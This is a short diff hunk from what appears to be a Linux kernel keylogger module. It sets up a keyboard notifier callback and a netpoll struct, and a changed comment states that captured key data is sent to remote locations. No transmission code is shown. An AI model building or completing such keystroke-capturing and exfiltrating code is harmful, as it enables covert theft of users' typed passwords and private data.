@@ -40,9 +40,10 @@ static struct notifier_block nb;
 static struct netpoll np;
 
 /*
-	keyboard_notifier_callback
-	must be of the type notifier_fn_t(notifier_block *nb,
-									  unsigned long action, void *data)
+/	keyboard_notifier_callback
+/	must be of the type notifier_fn_t(notifier_block *nb,
+/									  unsigned long action, void *data)
+/   This is where the key data is send to a remote locations
 */
 int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
 	struct keyboard_notifier_param *kb = data;
